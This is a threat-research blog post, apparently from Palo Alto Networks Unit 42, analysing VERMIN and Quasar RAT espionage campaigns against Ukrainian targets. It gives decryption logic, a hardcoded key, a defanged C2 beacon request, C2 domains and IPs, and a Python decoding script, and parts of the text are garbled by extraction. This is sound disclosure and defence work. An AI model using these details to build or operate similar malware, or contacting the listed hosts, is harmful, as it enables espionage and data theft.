Blog Home (url > Unit 42 (url > VERMIN: Quasar RAT and Custom Malware Used In UkraineVERMIN: Quasar RAT and Custom Malware Used In UkraineBy Tom Lancaster (url and Juan Cortes (url January 29, 2018 at 5:00 AM Category: Unit 42 (url Tags: AutoFocus (url ConfuserEx (url Espionage (url Quasar (url Quasar RAT (url Ukraine (url VERMIN (url  2,352 (3)(url custom-malware-used-ukraine%2F+VERMIN%3A+Quasar+RAT+and+Custom+Malware+Used+In+Ukraine)  (url u=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-vermin-quasar-rat- custom-malware-used-ukraine%2F)  (url mini=true&url=https%3A%2F%2Fresearchcenter.paloaltonetworks.com%2F2018%2F01%2Funit42-vermin- quasar-rat-custom-malware-used- ukraine%2F&title=VERMIN%3A+Quasar+RAT+and+Custom+Malware+Used+In+Ukraine&summary=&source=)(//www.reddit.com/submit)Summary Palo Alto Networks Unit 42 has discovered a new malware family written using the Microsoft .NET Framework which the authors call “VERMIN”; an ironic term for a RAT (Remote Access Tool). Cursory investigation into the malware showed the attackers not only had ﬂair for malware naming, but also for choosing interesting targets for their malware: nearly all the targeting we were able to uncover related to activity in Ukraine. Pivoting further on the initial samples we discovered, and their infrastructure, revealed a modestly sized campaign going back to late 2015 using both Quasar RAT (url and VERMIN. This blog shows the links between the activity observed, a walkthrough of the analysis of the VERMIN malware, and IOCs for all activity discovered. It all began with a tweet Our initial interest was piqued through a tweet (url from a fellow researcher who had identiﬁed some malware with an interesting theme relating to the Ukrainian Ministry of Defense as a lure.(url 1 – The decoy document displayed to users when executing the initial malware sampleThe sample was an SFX exe which displayed a decoy document to users before continuing to execute the malware; the hash of the ﬁle is given below. protocol used for exchanging structured information, for command and control (C2), which is something not often seen in malware samples. Using AutoFocus, we were quickly able to ﬁnd similar samples, by pivoting on the artifacts the malware created during a sandbox run, resulting in 7 other samples as shown in Figure 2.(url 2 – Pivoting in AutoFocus makes it easy to ﬁnd similar malware samples.Using the Maltego for AutoFocus (url transforms, we were then able to take the newly discovered samples and look at the C2 infrastructure in an attempt to see if we could link the samples together and in turn see if these C2’s were contacted by malware. We quickly built up a picture of a campaign spanning just over 2 years with a modest C2 infrastructure:(url 3 – Further analysis using AutoFocus & other data sources allows us to link up the activity discovered so far.The malware samples we discovered fell largely into two buckets: Quasar Rat and VERMIN. Quasar RAT is an open-source malware family which has been used in several other attack campaigns including criminal (url 2017) and espionage (url recent-targeted-attacks-against-governments/) motivated attacks. But a reasonable number of the samples were the new malware family, VERMIN. Looking at the samples in our cluster we could see the themes of the dropper ﬁles were similar to our ﬁrst sample. Notably, most of the other ﬁles we discovered did not come bundled with a decoy document and instead were simply the malware and dropper compiled with icons matching popular document viewing tools, such as Microsoft Word. Names of some of the other dropper binaries observed are given below, with the original Ukrainian on the left and the translated English (via Google) on the right: Original Name (Ukrainian)Translated Name (if applicable) Your certiﬁcate for free_receive help.exereport2.exe fuel supply report 08.06.17.exeN/AВаш_ сертиф_кати для отримання безоплатно_ вторинно_ допомоги.exe паливом 08.06.17.exelg_svet_smeta2016- 2017cod.exe.lugansk_2273_21.04.2017.exeN/AОтчет-районы_2кв- л-2016.exeReport-areas_2kv-l-2016.exeGiven the interesting targeting themes and the discovery of a new malware family, we decided to take a peek at what “VERMIN” was capable of and document it here. Dissecting VERMIN For this walkthrough, we’ll be going through the analysis of the following sample: 2017-07-04 12:46:43 UTCAnalyzing the malware dynamically quickly gave us a name for the malware, based on the PDB string present in the memory of the sample: Z:\Projects\Vermin\TaskScheduler\obj\Release\Licenser.pdb As is the case with many of the samples from the threat actors behind VERMIN, our sample is packed initially with the popular .NET obfuscation tool ConfuserEx (url Using a combination of tools, we were able to unpack and deobfuscate the malware. Following initial execution, the malware ﬁrst checks if the installed input language (url us/library/cc766191(v=ws.10).aspx) in the system is equal to any of the following:ru – Russian uk – Ukrainian ru-ru – Russian uk-ua – UkrainianIf none of the languages above is found the malware calls “Application.Exit() (url us/library/ms157894(v=vs.110).aspx)”, however despite its name, this API call doesn’t actually successfully terminate the application, and instead the malware will continue to run. It’s likely the author intended to terminate the application, in which case a call like “System.Environment.Exit()” would have been a better choice. The fact that this functionality does not work as intended suggests that if author tested the malware before deployment, they were likely to be doing so on systems where the language matches the list above, since otherwise they would notice that the function is not working as expected. After passing the installed language check the malware proceeds to decrypt an embedded resource using the following logic:It retrieves the ﬁnal four bytes of the encrypted resource. These four bytes are a CRC32 sum, and the malware then proceeds to brute force what 6-byte values will give this CRC32 sum. Once it ﬁnds this array of 6 bytes it performs an MD5 hash sum on the bytes, this value is used as the key. The ﬁrst 16bytes of the encrypted resource are then used as the IV for decryption Finally, using AES it decrypts the embedded resource.A script mirroring this routine can be found in appendix C. After decrypting the embedded resource, the malware passes several hardcoded arguments to the newly decrypted binary and performs a simple setup routine before continuing execution. The embedded resource contains all the main code for communications and functionality the RAT contains. First the malware attempts to decrypt all of the strings passed as parameters. If no arguments were supplied the malware attempts to read a conﬁguration ﬁle from a pre-deﬁned location expecting it to be base64-encoded and encrypted with 3- DES using a hardcoded key “KJGJH&^$f564jHFZ”: C:\Users\Admin\AppData\Roaming\Microsoft\AddIns\settings.dat If arguments were supplied, they are saved and encrypted to the same location as above. Parameters supplied are given below. Note that these are the actual variable names used by the malware author:serverIpList keyLoggerTaskAuthorThe decrypted resource is set to be run as a scheduled task every 30 minutes, indeﬁnitely. After this, the malware is ready to start operations, and does so by collecting various information about the infected machine, examples of collected information includes but is not limited to:Machine name Username OS name via WMI query Architecture: x64 vs x86 (64 vs. 32 bit) Local IP Address Checks Anti-Virus installed via WMI queryIf the Anti-Virus (AV) query determines any AV is installed the malware does not install the keylogger. The keylogger is embedded as a resource named ‘AdobePrintFr’. This binary is only packed with Confuser-Ex and is not further obfuscated. The malware then sends its initial beacon using a SOAP envelope to establish a secure connection. The author uses the WSHttpBinding() API – which allows the author to use WS-Addressing and purposely sets the WSMessageEncoding.Mtom to encode the SOAP messages. The author also sets up for using ‘Username’ authentication for communicating with its C2, presumably allowing the author easier control over the various infected hosts. A defanged exemplar request/response is 3POST /CS HTTP/1.1 MIME-Version: 1.0 Content-Type: multipart/related; type="application/xop+xml";start="<url";boundary="uuid:ae621187-99b 2-4b50-8a74-a33e8c7c0990+id=3";start-info="application/soap+xml" Host: akamainet024[.]info Content-Length: 1408 Expect: 100-continue Accept-Encoding: gzip, deflate Connection: Keep-Alive --uuid:ae621187-99b2-4b50-8a74-a33e8c7c0990+id=3 Content-ID: <url Content-Transfer-Encoding: 8bit Content-Type: application/xop+xml;charset=utf-8;type="application/soap+xml" <s:Envelope xmlns:s="url" xmlns:a="url"><s:Header ><a:Action s:mustUnderstand="1">url 159e7656-a3ea-4099-aa59-7ab04361ad99</a:MessageID><a:ReplyTo><a:Address>url </a:Address></a:ReplyTo><a:To s:mustUnderstand="1">url rityToken Context="uuid-9a01748a-8acf-449e-9a3d-febcff2f2406-3" xmlns:t="url"> <t:TokenType>url 05/02/trust/Issue</t:RequestType><t:KeySize>256</t:KeySize><t:BinaryExchange ValueType=" url s/2005/02/trust/tlsnego" EncodingType="url 1.0#Base64Binary">FgMBAFoBAABWAwFaCdyfpYsLZDbnCizlWg3iw2M80KiaWb+oIgzhJ1BvugAAGAAvADUABQAKwBPAFMAJwAoAMgA4ABMABAEAABX/ AQABAAAKAAYABAAXABgACwACAQA=</t:BinaryExchange></t:RequestSecurityToken></s:Body></s:Envelope> --uuid:ae621187-99b2-4b50-8a74-a33e8c7c0990+id=3--17 VERMIN collects all keystrokes and clipboard data and encrypts the data before storing it in the following folder: %appdata%\Microsoft\Proof\Settings.{ED7BA470­8E54­465E­825C­99712043E01C}\Profiles\. Each ﬁle is saved with the following format: “{0:dd-MM-yyyy}.txt”. The data is encrypted using the same method and 3-DES key, used to encrypt the conﬁguration ﬁle. Vermin supports the following commands:4 UploadFileFor most of these commands, the malware requires “hands-on-keyboard” style one-to-one interactions. Often remote access tools written in .NET borrow and steal code from other tools due to the plethora of code available through open source; however, it appears that whilst some small segments of code may have been lifted from other tools, this RAT is not a fork of a well-known malware family: it’s mostly original code. We have linked all the samples we have been able to identify to the same cluster of activity: this strongly suggests the VERMIN malware is used exclusively by this threat actor and this threat actor alone. We were unable to deﬁnitively determine the aims of the attackers or the data stolen. However, given the limited number of samples, the targeting themes observed, and the “hands-on-keyboard” requirement for most of the malwares’ operations (except for keylogging), it seems likely that the malware is used in targeted attacks in Ukraine. Ukraine remains a ripe target for attacks, even gaining its own dedicated Wikipedia page (url for attacks observed in 2017. In addition to the high-proﬁle attacks such as the Petya/NotPetya (url and BadRabbit (url which have been widely reported, there are likely many smaller campaigns like the one described in this blog aimed to steal data to gain an information advantage for the attackers’ sponsors. Palo Alto Networks defends our customers against the samples discussed in this blog in the following ways:Wildﬁre identiﬁes all samples mentioned in this article as malicious. Traps identiﬁes all samples mentioned in this article as malicious. C2 domains used in this campaign are blocked via Threat Prevention.AutoFocus customers can track samples related to this blog via the following tags:VERMIN (url#/tag/Unit42.VERMIN url#/tag/Unit42.VERMINCampaign url#/tag/Unit42.VERMIN) VERMINKeylogger (url#/tag/Unit42.VERMIN url#/tag/Unit42.VERMINCampaign url#/tag/Unit42.VERMINKeyLogger) VERMINCampaign (url#/tag/Unit42.VERMIN url#/tag/Unit42.VERMINCampaign url#/tag/Unit42.VERMINCampaign)Appendix A – C2 Addresses www.akamaicdn[.]ru www.akamainet066[.]info www.akamainet023[.]info www.akamainet021[.]infoakamainet023[.]info www.akamainet022[.]info www.cdnakamai[.]ru notifymail[.]ru www.notifymail[.]ru mailukr[.]net tech-adobe.dyndns[.]biz www.mailukr[.]net 185.158.153[.]222 94.158.47[.]228 195.78.105[.]23 94.158.46[.]251 188.227.75[.]189 212.116.121[.]46 185.125.46[.]24 5.200.53[.]181 Appendix B – Malware Samples Appendix C – Python script to decode VERMIN resources1 54#!/usr/local/bin/python __author__ = "Juan C Cortes" __version__ = "1.0" __email__ = "jcortes@paloaltonetworks.com" from random import randint from tabulate import tabulate from Crypto import Random from Crypto.Cipher import AES parser = argparse.ArgumentParser( usage="Decrypt strings for VerminRAT") help="Print debugging information") help="Output results file") help="Input file of newline separated strings or single string") help="Param use for decrypting blobs of data instead of strings. Blob is autosave to 'blob.out'") def write_out(output_list, headers, output_file=False): """ Pretty outputs list :param output_list: List to output """ print tabulate(output_list, headers, tablefmt="simple") with open(output_file, "ab") as file: file.write(tabulate(output_list, headers, tablefmt="simple")) file.write("\n\n") abyte = bytearray(6) for i in range(0,6): abyte[i] = randint(0, 0x7FFFFFFF) % 7 def parseEncrypteStr(encryptStr): try: decoded = encryptStr.decode('base64') hardcoded_crc32 = decoded[-4:] parsedEncrypted = decoded[16:-4] iv = decoded[:16] return hardcoded_crc32,parsedEncrypted,iv except Exception as e: def bruteForceCRC32Value(valuecrc32): crc32 = binascii.crc32(arry) crc32 = crc32 % (1 << 32) if crc32 == valuecrc32: def decryptStr(str,key,iv): aes = AES.new(key, AES.MODE_CBC, iv) blob = aes.decrypt(str) def parsePlainText(str): char = "" for i in str: if 0x20 <= ord(i) <= 0x127: def parseUnicde(str): for i in range(0,len(str)/2): uni += str[i] return uni.decode('utf16') except Exception as e: args = parse_arguments().parse_args() if args.vverbose: logging.basicConfig( level=logging.DEBUG, format=' %(asctime)s - %(levelname)s - %(message)s') if args.blob and os.path.exists(args.input) != True: b = args.input crc32Hardcode, encryptedStr, iv = parseEncrypteStr(b) crc32Hardcode = bytearray(crc32Hardcode) crc32Hardcode = struct.unpack('<I', crc32Hardcode)[0] bruteArray = bruteForceCRC32Value(crc32Hardcode) m = hashlib.md5() m.update(bruteArray) key = m.digest() plain = decryptStr(encryptedStr, key, iv) with open('blob.out', "wb") as file: file.write(plain) if os.path.exists(args.input) != True: strs.append(args.input) with open(args.input, "rb") as open_file: for line in open_file: hash = line.rstrip() strs.append(hash) for s in strs: crc32Hardcode,encryptedStr,iv = parseEncrypteStr(s)crc32Hardcode = bytearray(crc32Hardcode) crc32Hardcode = struct.unpack('<I', crc32Hardcode)[0] bruteArray = bruteForceCRC32Value(crc32Hardcode) m = hashlib.md5() m.update(bruteArray) key = m.digest() plain = decryptStr(encryptedStr,key,iv) parsestr = parsePlainText(plain) unistr = parseUnicde(plain) headers = ["ASCII","UNICODE"] outputlist = [[parsestr,unistr]] write_out(outputlist, headers, args.output_file) if __name__ == '__main__': 158Got something to say?Leave a comment Notify me of followup comments via e-mailName (required)Email (required)WebsiteSUBMITSUBSCRIBE TO NEWSLETTERSEmailCOMPANY Company (url Careers (url Sitemap (url Report a Vulnerability (url NOTICES Privacy Policy (url Terms of Use (url Manage Subscription (url (url  (url  (url© 2016 Palo Alto Networks, Inc. All rights reserved.SALES > 888.219.8447 SEE A DEMO TAKE A TEST DRIVE (HTTP://CONNECT.PALOALTONETWORKS.COM/VIRTUAL-UTD) 